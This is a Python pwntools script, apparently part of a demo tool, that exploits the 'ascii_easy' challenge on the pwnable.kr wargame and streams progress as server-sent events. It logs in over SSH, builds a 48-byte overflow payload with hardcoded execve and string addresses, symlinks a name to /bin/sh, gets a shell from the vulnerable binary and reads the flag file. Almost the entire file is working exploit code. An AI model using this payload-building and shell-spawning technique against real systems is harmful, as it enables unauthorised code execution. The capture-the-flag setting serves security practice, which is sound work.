from pwn import *
import json
import time

def exploit_ascii_easy(challenge_config):
    """ascii_easy exploit implementation"""
    def log(msg):
        yield f"data: {json.dumps({'type': 'log', 'message': msg})}\n\n"
    
    try:
        yield from log("Connecting to pwnable.kr...")
        
        context.log_level = 'error'
        s = ssh(host=challenge_config['ssh_host'], 
                port=challenge_config['ssh_port'], 
                user=challenge_config['ssh_user'], 
                password=challenge_config['ssh_pass'])
        yield from log("✓ Connected successfully")
        
        yield from log("Building exploit payload...")
        
        exploit_payload = b'aaaabaaacaaadaaaeaaafaaagaaahaaa'
        exploit_payload += p32(0x5561676a)  # execve call address
        exploit_payload += p32(0x55617b33)  # SJA string address
        exploit_payload += p32(0x55564a3b)  # NULL pointer
        exploit_payload += p32(0x55564a3b)  # NULL pointer
        
        payload_str = exploit_payload.decode('latin-1')
        yield f"data: {json.dumps({'type': 'payload', 'payload': repr(payload_str)})}\n\n"
        yield from log("✓ Payload constructed (48 bytes)")
        
        yield from log("Setting up temporary environment...")
        tmpdir = '/tmp/yael_demo_' + str(os.getpid())
        s.run(f'mkdir -p {tmpdir}')
        s.run(f'cd {tmpdir} && ln -sf /bin/sh SJA')
        yield from log("✓ Symlink created: SJA -> /bin/sh")
        
        yield from log("Launching exploit...")
        p = s.process(['/home/ascii_easy/ascii_easy', payload_str], 
                      cwd=tmpdir, 
                      env={'PATH': tmpdir + ':/bin:/usr/bin'})
        
        time.sleep(0.3)
        
        yield from log("Executing shell command...")
        p.sendline(b'cat /home/ascii_easy/flag')
        
        all_output = b''
        for i in range(5):
            try:
                chunk = p.recv(timeout=0.5)
                all_output += chunk
            except:
                break
        
        p.sendline(b'exit')
        try:
            remaining = p.recvall(timeout=2)
            all_output += remaining
        except:
            pass
        
        output_str = all_output.decode(errors='ignore')
        
        flag_found = False
        for line in output_str.split('\n'):
            line = line.strip()
            if 'ASCII_armor' in line or ('_' in line and len(line) > 20 and 'd3al_with' in line):
                yield from log("✓ Flag captured!")
                yield f"data: {json.dumps({'type': 'flag', 'flag': line})}\n\n"
                flag_found = True
                break
        
        if not flag_found:
            yield from log("⚠ Flag not found in output")
        
        p.close()
        s.close()
        
        yield from log("✓ Exploit complete")
        yield f"data: {json.dumps({'type': 'done'})}\n\n"
        
    except Exception as e:
        import traceback
        yield from log(f"✗ Error: {str(e)}")
        yield f"data: {json.dumps({'type': 'error', 'message': str(e)})}\n\n"